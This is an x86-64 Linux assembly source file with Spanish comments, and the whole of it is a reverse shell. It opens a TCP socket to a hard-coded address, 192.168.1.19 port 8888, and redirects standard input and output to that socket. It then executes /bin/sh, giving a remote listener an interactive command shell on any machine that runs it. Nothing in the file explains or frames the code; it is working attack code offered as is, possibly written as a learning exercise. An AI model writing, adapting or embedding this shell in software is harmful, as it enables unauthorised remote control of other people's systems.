section .bss
	servidor_addr resb 16   ;Reservar 16 bytes para struct sockaddr_in

section .text
	global _start

_start:
	;Creación de socket
    	;socket(AF_INET, SOCK_STREAM, 0)
	xor rdi, rdi
	mov dil, 2      ;AF_INET
	xor rsi, rsi
	mov sil, 1      ;SOCK_STREAM
	xor rdx, rdx    ;Protocol = 0
	mov rax, 41     ;syscall: socket
	syscall         ;socket() -> RAX = _socket

	mov rdi, rax    ;Guardar _socket en rdi 

 	;Configuración de servidor_addr en memoria
	mov rsi, servidor_addr
	mov word [rsi], 2       ;AF_INET
	mov word [rsi+2], 0xb822 ;Puerto 8888
	mov dword [rsi+4], 0x1301a8c0 ;IP 192.168.1.19
	mov qword [rsi+8], 0    ;sin_zero[8] (relleno)

	;Conexión
	;connect(_socket, servidor_addr, 16)
	mov rdx, 16        ;Tamaño de la estructura
	mov rax, 42        ;syscall: connect
	syscall            ;connect(_socket, &servidor_addr, 16)

	;Redirecciones
	;dup2(_socket, 0) - stdin
	mov rsi, 0
	mov rax, 33
	syscall

	;dup2(_socket, 1) - stdout
	mov rsi, 1
	mov rax, 33
	syscall

	;dup2(_socket, 2) - stderr
	;mov rsi, 2
	;mov rax, 33
	;syscall

	;Ejecución de shell
	xor rdx, rdx      ;NULL para envp
	lea rdi, [rel MiShell]  ;Puntero a "/bin/sh"
	push rdx
	push rdi
	mov rsi, rsp      ;argv = {"/bin/sh", NULL}

	;execve("/bin/sh", "argv", NULL)
	mov rax, 59       ;syscall: execve
	syscall           

section .data
	MiShell db "/bin/sh", 0

	;mov dword [rsi+4], 0x1301a8c0 ;IP 192.168.1.19
